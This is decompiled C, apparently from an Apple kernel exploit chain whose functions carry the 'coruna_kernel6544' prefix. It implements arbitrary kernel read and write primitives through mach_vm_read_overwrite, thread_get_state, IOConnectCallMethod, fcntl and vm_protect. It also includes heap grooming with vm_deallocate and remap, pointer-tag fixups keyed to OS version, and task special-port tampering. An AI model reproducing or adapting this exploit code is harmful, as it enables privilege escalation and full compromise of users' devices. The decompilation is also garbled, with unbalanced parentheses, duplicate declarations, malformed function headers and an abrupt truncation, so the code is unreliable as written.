  addr = *(long *)(handle + 0x5e0);
  *(uint8_t *)(*(long *)(handle + 0x5d8) + handle) = 0x41;
  *(uint8_t *)(addr + handle) = 0x41;
  handle = *(long *)(handle + *(long *)(handle + 0x478) * 8 + 0x468);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  _thread_switch(0,2,0);
  handle = *(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8);
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0x38),0xc000);
  *(uint64_t *)(handle + 0x38) = 0;
  coruna_vm_remap_7d00(lv2,0xc000,0);
  coruna_vm_region_recurse_64(lv2);
  *(vm_address_t *)(*(long *)(handle + 0x490 + *(long *)(handle + 0x4a0) * 8) + 0x38) = lv2;
  coruna_vm_allocate_9cc0(handle,*(uint64_t *)(handle + 0x598));
  coruna_madvise(handle,*(long *)(handle + 0x598) + -4);
  handle = 0;
  do {
    coruna_vm_remap_7d00(*(uint64_t *)(*(long *)(handle + 0x30) + handle),0x4000,0);
    handle = handle + 8;
  } while (handle != 800000);
  return;
}





bool coruna_kernel6544_via_fcntl_1bf84(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
                               *(uint32_t *)(handle + 0x178),id_2,scratch);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
             *(uint32_t *)(handle + 0x178),id_2,scratch);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1bf84(handle,val,id_2,4,1);
        }
      }
      else {
        err = coruna_ioconnectcallmethod(handle,val,id_2,4,1);
      }
    }
    else {
      err = coruna_thread_get_state(handle,val,id_2,4,1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,id_2,4,1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_thread_get_state(byte *arg,long handle,long addr_2,uint size,int flags)
{
  unsigned long u;
  unsigned long size;
  void *ptr;
  uint version;
  int err;
  uint port;
  uint tag;
  long handle;
  uint kind;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  uint64_t type_id_11;
  unsigned long type_id_12;
  size_t ls16;
  int scratch;
  mach_msg_type_number_t bootargs;
  natural_t thread_attr [134];
  long host_info;
  uint64_t serial_buf[2];
  
  if ((((1 < *(int *)(arg + 0xac) + 1U) && (*(long *)(arg + 0xd8) != 0)) &&
      (handle = coruna_kernel6544_residual_225(arg), handle != 0)) &&
     ((scratch = -1, flags == 0 || (err = coruna_open_dev_null(&scratch), err == 0)))) {
    if (size != 0) {
      kind = 0;
      do {
        type_id_10 = size - kind;
        u = handle + (unsigned long)kind;
        if ((((*(unsigned long *)(arg + 0x188) & u) == 0) && (0x3fff < type_id_10)) &&
           (err = coruna_uuid_is_null(arg), err != 0)) {
          port = 0x80000;
          if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
            port = 0x4000;
          }
          version = 0x210;
          if (*(unsigned long *)(arg + 0x158) < 0x27120000000000) {
            version = port;
          }
          if (version <= type_id_10) {
            type_id_10 = version;
          }
          port = coruna_task_map_corpse_info_64(arg,u,addr_2 + (unsigned long)kind,type_id_10);
fail:
          if (port != 0) break;
        }
        else {
          if (0x20f < type_id_10) {
            type_id_10 = 0x210;
          }
          if ((*(int *)(arg + 0xac) + 1U < 2) || (*(long *)(arg + 0xd8) == 0)) break;
          if (type_id_10 != 0) {
            type_id_8 = 0;
            ls16 = 0;
            do {
              size = type_id_8 + u;
              ptr = (void *)(type_id_8 + addr_2 + (unsigned long)kind);
              type_id_9 = type_id_10 - type_id_8;
              if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
                serial_buf[0] = coruna_u64_pack((serial_buf[0]), (0x84));
                type_id = *(unsigned long *)(arg + 0x188) & size;
                if ((unsigned long)*(uint *)(arg + 0x180) - 0x210 <= type_id) {
                  type_id = (unsigned long)*(uint *)(arg + 0x180) - 0x210;
                }
                handle = type_id + (size & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff));
                type_id_11 = **(uint64_t **)(arg + 200);
                DataSynchronizationBarrier(2,3,0);
                **(long **)(arg + 200) = handle + -0x10;
                port = _thread_get_state(*(thread_act_t *)(arg + 0xac),0x11,thread_attr,
                                          (mach_msg_type_number_t *)serial_buf);
                if (port == 0) {
                  if ((mach_msg_type_number_t)serial_buf[0] == 0x84) {
                    type_id = (handle - size) + 0x210;
                    ls16 = type_id_9;
                    if (type_id <= type_id_9) {
                      ls16 = type_id;
                    }
                    _memcpy(ptr,(void *)((long)thread_attr + (size - handle)),ls16);
                    port = 0;
                  }
                  else {
                    port = 0xad022;
                  }
                }
                else {
                  port = port | 0x80000000;
                }
                **(uint64_t **)(arg + 200) = type_id_11;
              }
              else {
                serial_buf[0] = 0;
                bootargs = 0x84;
                type_id_12 = *(unsigned long *)(arg + 0x188);
                type_id = type_id_12 & size;
                if ((unsigned long)*(uint *)(arg + 0x180) - 0x210 <= type_id) {
                  type_id = (unsigned long)*(uint *)(arg + 0x180) - 0x210;
                }
                handle = coruna_fn_ptr_cast_2(arg,*(uint64_t *)(arg + 0xe0));
                if (handle == 0) {
                  port = coruna_kernel6544_via_mach_port_deallocate_2b24c_2(arg,*(uint64_t *)(arg + 0xd8),serial_buf,8,0);
                  if (port != 0) goto done;
                  *(uint64_t *)(arg + 0xe0) = serial_buf[0];
                }
                else {
                  serial_buf[0] = *(uint64_t *)(arg + 0xe0);
                }
                handle = type_id + (size & (type_id_12 ^ 0xffffffffffffffff));
                DataSynchronizationBarrier(2,3,0);
                host_info = handle + -0x10;
                port = coruna_kernel6544_via_mach_port_deallocate_2b24c_3(arg,*(uint64_t *)(arg + 0xd8),&host_info,8,0);
                if (port == 0) {
                  port = _thread_get_state(*(thread_act_t *)(arg + 0xac),0x11,thread_attr,
                                            &bootargs);
                  if (port == 0) {
                    if (bootargs == 0x84) {
                      type_id = (handle - size) + 0x210;
                      ls16 = type_id_9;
                      if (type_id <= type_id_9) {
                        ls16 = type_id;
                      }
                      _memcpy(ptr,(void *)((long)thread_attr + (size - handle)),ls16);
                      port = 0;
                    }
                    else {
                      port = 0xad022;
                    }
                  }
                  else {
                    port = port | 0x80000000;
                  }
                  tag = coruna_kernel6544_via_mach_port_deallocate_2b24c_3(arg,*(uint64_t *)(arg + 0xd8),serial_buf,8,0);
                  version = tag;
                  if (port != 0) {
                    version = port;
                  }
                  if (tag != 0) {
                    port = version;
                  }
                }
              }
done:
            } while ((port == 0) && (type_id_8 = ls16 + type_id_8, type_id_8 < type_id_10));
            if (port != 0) break;
          }
        }
        kind = type_id_10 + kind;
      } while (kind < size);
    }
    if (scratch != -1) {
      coruna_close();
    }
  }
  return;
}





kern_return_t
void coruna_mach_vm_read_overwrite(vm_map_t arg,long handle,unsigned long arg_x,unsigned long arg,long addr_2,unsigned long *val)
{
  unsigned long u;
  mach_vm_size_t size;
  kern_return_t lk2;
  unsigned long size;
  unsigned long scratch;
  
  if (arg_x == 0) {
    lk2 = 4;
  }
  else {
    size = 0;
    u = arg_x;
    if (arg != 0) {
      u = arg;
    }
    do {
      size = arg_x;
      if (u <= arg_x) {
        size = u;
      }
      scratch = arg_x;
      lk2 = _mach_vm_read_overwrite(arg,size + handle,size,size + addr_2,&scratch);
      if (lk2 != 0) {
        return lk2;
      }
      size = (unsigned long)(uint)((int)scratch + (int)size);
      arg_x = arg_x - scratch;
    } while (arg_x != 0);
    lk2 = 0;
    if (val != (unsigned long *)0x0) {
      *val = size;
    }
  }
  return lk2;
}





bool coruna_kernel6544_via_fcntl_1bf84_2(long handle,uint64_t val,uint64_t *id_2)
{
  int err;
  int status;
  uint8_t scratch[8];
  
  *id_2 = 0;
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
                               (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
                               id_2,scratch);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,
             (long)*(int *)(handle + 0x168),*(uint32_t *)(handle + 0x178),
             id_2,scratch);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1bf84(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
        }
      }
      else {
        err = coruna_ioconnectcallmethod(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
      }
    }
    else {
      err = coruna_thread_get_state(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))
                      (handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





uint64_t coruna_kernel6544_via_ctx_test_flag_5(uint *size,uint64_t val)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_ctx_test_flag(size,0x5584001);
  if ((err != 0) && ((*size & 0x5584001) != 0)) {
    if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
    u = coruna_kernel6544_via_ctx_test_flag_7(size,val);
    return u;
  }
  return val;
}





uint64_t coruna_kernel6544_via_ctx_test_flag_6(uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  uint64_t u;
  unsigned long unaff_x30;
  
  err = coruna_ctx_test_flag(val,0x5584001);
  if (err == 0) {
    return id_2;
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  u = coruna_kernel6544_via_ctx_test_flag_7(val,id_2);
  return u;
}





unsigned long coruna_kernel6544_via_ctx_test_flag_7(long arg,unsigned long val)

{
  int count;
  
  if ((val != 0) && ((val >> 0x37 & 1) != 0)) {
    count = coruna_ctx_test_flag(arg,8);
    if ((count == 0) &&
       ((count = coruna_ctx_test_flag(arg,0x5000000), count == 0 ||
        (*(unsigned long *)(arg + 0x158) < 0x22580a06c00000)))) {
      val = val | 0xffffff8000000000;
    }
    else {
      val = val | 0xffff800000000000;
    }
  }
  return val;
}





bool coruna_mach_vm_machine_attribute_29df8(long handle,mach_vm_address_t arg,uint64_t val,int flags)
{
  uint u;
  int err;
  uint size;
  mach_vm_address_t *lpm4;
  long handle;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  
  scratch = val;
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    thread_attr = val;
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
                                 (vm_offset_t)&scratch,*(mach_msg_type_number_t *)(handle + 0x168)
                                );
          thread_attr = coruna_u64_pack((thread_attr), (7));
          _mach_vm_machine_attribute
                    (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),
                     1,(vm_machine_attribute_val_t *)&thread_attr);
          return err == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             err = _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,
             (vm_offset_t)&scratch,*(mach_msg_type_number_t *)(handle + 0x168)
             );
             thread_attr = coruna_u64_pack((thread_attr), (7));
             _mach_vm_machine_attribute
             (*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(long)*(int *)(handle + 0x168),
             1,(vm_machine_attribute_val_t *)&thread_attr);
             return err == 0;
        }
        else {
          bootargs = val;
          if (flags == 0) {
            u = coruna_fcntl_1c910(handle,arg,&bootargs,*(uint32_t *)(handle + 0x168),1);
          }
          else {
            u = coruna_mach_absolute_time_1b5b4(handle,1,&k_kernel_slot_2710);
            if (u == 0) {
              if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
                size = coruna_open_sepmgr_2222c(handle,arg,val);
              }
              else {
                handle = *(long *)(handle + 0x28);
                if ((handle == 0) || (*(semaphore_t *)(handle + 8) + 1 < 2)) {
                  size = 0xad001;
                }
                else {
                  size = 0xad001;
                  if (1 < *(int *)(handle + 0xc) + 1U) {
                    lpm4 = (mach_vm_address_t *)(handle + 0x20);
                    *lpm4 = arg;
                    *(uint64_t **)(handle + 0x28) = &thread_attr;
                    *(uint64_t *)(handle + 0x30) = 8;
                    u = _semaphore_signal(*(semaphore_t *)(handle + 8));
                    if (u == 0) {
                      u = _semaphore_timedwait
                                        (*(semaphore_t *)(handle + 0xc),(mach_timespec_t)0x3);
                      size = *(uint *)(handle + 0x3c);
                      if (size != 0) {
                        *lpm4 = 0;
                        *(uint64_t *)(handle + 0x28) = 0;
                        *(uint64_t *)(handle + 0x30) = 0;
                        coruna_semaphore_destroy(handle,0);
                        goto cleanup;
                      }
                      size = 0;
                      if (u != 0) {
                        size = u | 0x80000000;
                      }
                    }
                    else {
                      size = u | 0x80000000;
                    }
                    *lpm4 = 0;
                    *(uint64_t *)(handle + 0x28) = 0;
                    *(uint64_t *)(handle + 0x30) = 0;
                  }
                }
              }
cleanup:
              u = 0xad008;
              if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
                u = 0;
                *(uint32_t *)(*(long *)(handle + 0x118) + 1) = 0;
              }
              if (size != 0) {
                u = size;
              }
            }
          }
        }
      }
      else {
        u = coruna_ioconnectcallmethod_1d1b4(handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
      }
    }
    else {
      if (*(long *)(&k_kernel_slot_1d48 + handle) == 0) {
        err = 5;
        return err == 0;
      }
      u = coruna_thread_switch(handle,arg,&thread_attr,*(uint32_t *)(handle + 0x168),1);
    }
  }
  else {
    u = (**(void (**)(handle + 0x40))
                      (handle,arg,&scratch,*(uint32_t *)(handle + 0x168),1);
  }
  err = 0;
  if (u != 0) {
    err = 5;
  }
done:
  return err == 0;
}





void coruna_call_mach_vm_machine_attribute_29df8(void)
{
  coruna_mach_vm_machine_attribute_29df8();
  return;
}





bool coruna_kernel6544_via_vm_protect(long handle,unsigned long arg,uint64_t val)
{
  int err;
  bool err;
  uint8_t scratch[32];
  unsigned long bootargs;
  long thread_attr [8];
  
  thread_attr[6] = 0;
  thread_attr[3] = 0;
  thread_attr[2] = 0;
  thread_attr[5] = 0;
  thread_attr[4] = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  err = coruna_nop_stub_3(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
                       scratch);
  if (err == 0) {
    err = false;
  }
  else {
    err = coruna_vm_protect(handle,bootargs & 0xffffffffc000,thread_attr);
    err = err == 0;
    if (err) {
      *(uint64_t *)((*(unsigned long *)(handle + 0x188) & arg) + thread_attr[0]) = val;
    }
    if (thread_attr[0] != 0) {
      coruna_mach_port_deallocate_2d808(handle,thread_attr);
    }
  }
  return err;
}





void coruna_nop_stub_7(void)
{
  coruna_kernel6544_via_fcntl_1c910();
  return;
}





long coruna_return_zero_20e90(long handle,unsigned long arg)
{
  long handle;
  uint scratch;
  
  if ((arg & 0xffffffff) != 0) {
    if (-1 < (int)arg) {
      handle = coruna_kernel6544_via_ctx_test_flag_11(handle,0,&scratch);
      if (handle == 0) {
        return 0;
      }
      return ((arg & 0xffffffff) << ((unsigned long)scratch & 0x3f)) + handle;
    }
    if ((*(long *)(handle + 0x1f0) != 0) && (*(uint *)(handle + 0x1f8) != 0)) {
      return *(long *)(handle + 0x1f0) + (arg & 0x7fffffff) * (unsigned long)*(uint *)(handle + 0x1f8)
    }
  }
  return 0;
}





unsigned long coruna_kernel6544_via_ctx_test_flag_8(long arg,unsigned long val,uint *n)

{
  int count;
  unsigned long type_id_14;
  unsigned long u;
  unsigned long size;
  uint version;
  unsigned long type_id_15;
  long serial_12;
  unsigned long tag;
  
  count = coruna_ctx_test_flag(arg,0x5584001);
  if (count == 0) {
    version = (uint)(ushort)(val >> 0x30);
    if ((val & 0x800000000000) != 0) {
      version = (uint)((val >> 0x30) << 0xe);
    }
    *n = version;
    tag = val | 0xffff800000000000;
  }
  else {
    count = coruna_ctx_test_flag(arg,8);
    if ((count == 0) && (count = coruna_ctx_test_flag(arg,0x5000000), count == 0)) {
      type_id_14 = *(unsigned long *)(arg + 0x158);
      u = 0xffffffffffffffe0;
      if (type_id_14 < 0x22581401900000) {
        u = 0xffffff9ffffffff0;
      }
      size = 0xffffffbfffffc000;
      if (type_id_14 < 0x22581401900000) {
        size = 0xffffff9fffffc000;
      }
      serial_12 = 0x25;
      if (0x225814018fffff < type_id_14) {
        serial_12 = 0x26;
      }
      type_id_15 = 0x6000000000;
      tag = 0x4000000000;
    }
    else {
      type_id_14 = *(unsigned long *)(arg + 0x158);
      u = 0xffffffffffffffe0;
      if (type_id_14 < 0x22581401900000) {
        u = 0xffff9ffffffffff0;
      }
      size = 0xffffbfffffffc000;
      if (type_id_14 < 0x22581401900000) {
        size = 0xffff9fffffffc000;
      }
      serial_12 = 0x2d;
      if (0x225814018fffff < type_id_14) {
        serial_12 = 0x2e;
      }
      type_id_15 = 0x600000000000;
      tag = 0x400000000000;
    }
    if (type_id_14 < 0x22581401900000) {
      tag = type_id_15;
    }
    type_id_15 = 3;
    if (0x225814018fffff < type_id_14) {
      type_id_15 = 1;
    }
    type_id_15 = type_id_15 & val >> serial_12;
    if (type_id_15 == 0) {
      version = ((uint)val & 0x3fff) << 0xe;
    }
    else {
      if (0x225814018fffff < type_id_14) {
        type_id_15 = val & 0x10 | 0x20;
      }
      version = (uint)(type_id_15 << (val & 0xf));
      size = u;
    }
    *n = version;
    tag = size & val | tag;
  }
  return tag;
}





bool coruna_kernel6544_via_fcntl_1bf84_3(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x30) == (void (*)0x0) {
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
                               *(uint32_t *)(handle + 0x178),size_3,0);
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,id_2,
             *(uint32_t *)(handle + 0x178),size_3,0);
             return status == 0;
        }
        else {
          err = coruna_fcntl_1bf84(handle,val,size_3,id_2);
        }
      }
      else {
        err = coruna_ioconnectcallmethod(handle,val,size_3,id_2);
      }
    }
    else {
      err = coruna_thread_get_state(handle,val,size_3,id_2);
    }
  }
  else {
    err = (**(void (**)(handle + 0x30))(handle,val,size_3,id_2);
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_nop_stub_8(void)
{
  coruna_kernel6544_via_fcntl_1bf84_3();
  return;
}





bool coruna_kernel6544_via_fcntl_1c910(long handle)
{
  int err;
  int status;
  
  if (*(void (**)(handle + 0x40) == (void (*)0x0) {
    if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
      if ((*(int *)(handle + 0xe8) + 1U < 2) ||
         ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
        if ((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1))
        {
fail:
          status = coruna_mach_vm_machine_attribute_1e630(*(uint32_t *)(&k_kernel_slot_1918 + handle));
          return status == 0;
        }
        if ((*(int *)(&k_kernel_slot_1940 + handle) == -1) || (*(long *)(handle + 0x218) == 0)) {
          if ((*(int *)(&k_kernel_slot_1938 + handle) == -1) || (*(int *)(&k_kernel_slot_193c + handle) == -1)
             status = coruna_mach_vm_machine_attribute_1e630(*(uint32_t *)(&k_kernel_slot_1918 + handle));
             return status == 0;
        }
        else {
          err = coruna_fcntl_1c910();
        }
      }
      else {
        err = coruna_ioconnectcallmethod_1d1b4();
      }
    }
    else {
      err = coruna_thread_switch();
    }
  }
  else {
    err = (**(void (**)(handle + 0x40))();
  }
  status = 0;
  if (err != 0) {
    status = 5;
  }
done:
  return status == 0;
}





void coruna_nop_stub_9(void)
{
  coruna_kernel6544_via_fcntl_1c910();
  return;
}





void coruna_kernel6544_via_mach_vm_machine_attribute(long handle,long addr_2,uint64_t val)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  uint32_t scratch;
  
  scratch = (uint32_t)val;
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err == 0) {
      addr_2 = coruna_kernel6544_via_return_zero_30b94(handle,addr_2);
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
      coruna_mach_vm_machine_attribute(handle,addr_2,val);
      return;
      }
      ___stack_chk_fail();
    }
    else {
      coruna_vm_deallocate_f7f8(handle,addr_2,&scratch,4);
    }
    return;
  }
fail:
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    coruna_mach_vm_machine_attribute(handle,addr_2,val);
    return;
  }
    ___stack_chk_fail();
}





void coruna_kernel6544_via_mach_vm_machine_attribute_29df8(long handle,long addr_2,uint64_t val)
{
  uint8_t u;
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    u = *(uint8_t *)(handle + 0xc);
  }
  else {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
      coruna_kernel6544_via_kernel6544_via_return_zero_30a2c(handle,addr_2,val);
      return;
    }
    addr_2 = coruna_kernel6544_via_return_zero_30b94(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
    u = *(uint8_t *)(handle + 0xc);
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) != 0) {
    ___stack_chk_fail();
}
  coruna_mach_vm_machine_attribute_29df8(handle,addr_2,val,u);
  return;
}





void coruna_kernel6544_via_vm_deallocate_f7f8(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  void (*ptr)(void);
  int err;
  unsigned long unaff_x30;
  
  if (0x1f530f027fffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_ctx_test_flag(handle,0x5184001);
    if (err != 0) {
      if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
        coruna_vm_deallocate_f7f8(handle,addr_2,val,id_2);
        return;
      }
    ___stack_chk_fail();
}
    addr_2 = coruna_kernel6544_via_return_zero_30b94(handle,addr_2);
    if (addr_2 == 0) {
      return;
    }
  }
  if (((unaff_x30 ^ unaff_x30 << 1) >> 0x3e & 1) == 0) {
    coruna_kernel6544_via_fcntl_1c910(handle,addr_2,val,id_2,1);
    return;
  }
    ___stack_chk_fail();
}





kern_return_t
void coruna_mach_vm_machine_attribute_1e630(vm_map_t arg,mach_vm_address_t arg_x,long handle,uint size,uint flags_2)
{
  uint u;
  uint dataCnt;
  kern_return_t lk2;
  long handle;
  uint size;
  vm_machine_attribute_val_t scratch;
  
  u = size;
  if (flags_2 != 0) {
    u = flags_2;
  }
  if (size != 0) {
    handle = 0;
    size = size;
    do {
      dataCnt = size;
      if (u <= size) {
        dataCnt = u;
      }
      lk2 = _mach_vm_write(arg,handle + arg_x,handle + handle,dataCnt);
      if (lk2 != 0) {
        return lk2;
      }
      handle = handle + (unsigned long)dataCnt;
      size = size - dataCnt;
    } while (size != 0);
  }
  scratch = 7;
  _mach_vm_machine_attribute(arg,arg_x,(unsigned long)size,1,&scratch);
  return 0;
}





unsigned long coruna_port_space_info(long arg)

{
  mach_port_name_t name;
  uint8_t *data;
  uint8_t *buf;
  int j;
  uint size;
  kern_return_t lk5;
  uint type_id_15;
  unsigned long port;
  long serial_13;
  unsigned long type_id_17;
  mach_msg_type_number_t cache_65;
  integer_t cache_31 [3];
  int cache_66;
  uint64_t sa_saved;
  uint64_t frame;
  uint64_t cache_52;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint32_t cache_43;
  mach_msg_type_number_t cache_67;
  ipc_info_tree_name_array_t cache_32;
  mach_msg_type_number_t cache_68;
  ipc_info_name_array_t cache_21;
  ipc_info_space_t cache_53;
  ipc_space_t cache_69;
  
  if (arg == 0) {
    port = 0xad001;
  }
  else if (*(int *)k_kernel_bootstrap_port_slot + 1U < 2) {
    port = 0x28003;
    cache_69 = 0;
    j = coruna_call_mach_port_mod_refs_30670(arg,1,&cache_69);
    if (j != 0) {
      cache_53.iis_genno_mask = 0;
      cache_53.iis_table_size = 0;
      cache_53.iis_table_next = 0;
      cache_53.iis_tree_size = 0;
      cache_53.iis_tree_small = 0;
      cache_53.iis_tree_hash = 0;
      cache_21 = (ipc_info_name_array_t)0x0;
      cache_68 = 0;
      cache_32 = (ipc_info_tree_name_array_t)0x0;
      cache_67 = 0;
      size = _mach_port_space_info(cache_69,&cache_53,&cache_21,&cache_68,&cache_32,&cache_67);
      buf = k_kernel_mach_task_self_slot;
      if (size == 0) {
        if (cache_68 != 0) {
          serial_13 = 0;
          type_id_17 = 0;
          do {
            cache_43 = 0;
            sa_new = 0;
            cache_52 = 0;
            tmp_buf = 0;
            path_buf = 0;
            ghidra_stack_3 = 0;
            cache_31[0] = 0;
            cache_31[1] = 0;
            frame = 0;
            sa_saved = 0;
            cache_65 = 0x11;
            if (((((*(byte *)((long)&cache_21->iin_type + serial_13 + 2) & 0x1f) != 0) &&
                 (name = *(mach_port_name_t *)((long)&cache_21->iin_name + serial_13), 1 < name + 1)) &&
                (lk5 = _mach_port_get_attributes(cache_69,name,7,cache_31,&cache_65), lk5 == 0))
               && ((cache_66 == 0x80 && ((~cache_52 & 6) == 0)))) {
              if ((1 < *(int *)((long)&cache_21->iin_name + serial_13) + 1U) &&
                 ((serial_13 = coruna_kernel6544_via_return_zero_2c0bc(arg,cache_69), data = k_kernel_bootstrap_port_slot,
                  serial_13 != 0 &&
                  (port = coruna_arc4random_buf(arg,serial_13,k_kernel_bootstrap_port_slot), (int)port == 0
                  )))) {
                type_id_15 = _task_set_special_port(*(task_t *)buf,4,*(mach_port_t *)data);
                size = 0;
                if (type_id_15 != 0) {
                  size = type_id_15 | 0x80000000;
                }
                port = (unsigned long)size;
              }
              break;
            }
            type_id_17 = type_id_17 + 1;
            serial_13 = serial_13 + 0x1c;
          } while (type_id_17 < cache_68);
        }
      }
      else {
        port = (unsigned long)(size | 0x80000000);
      }
      if ((cache_21 != (ipc_info_name_array_t)0x0) && (cache_68 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)cache_21,(unsigned long)cache_68 * 0x1c);
      }
      if ((cache_32 != (ipc_info_tree_name_array_t)0x0) && (cache_67 != 0)) {
        _mach_vm_deallocate(*(vm_map_t *)buf,(mach_vm_address_t)cache_32,(unsigned long)cache_67 * 0x24);
      }
      _mach_port_deallocate(*(ipc_space_t *)buf,cache_69);
    }
  }
  else {
    port = 0;
  }
  return port;
}





int coruna_semaphore_timedwait(long handle,uint size)
{
  kern_return_t lk1;
  
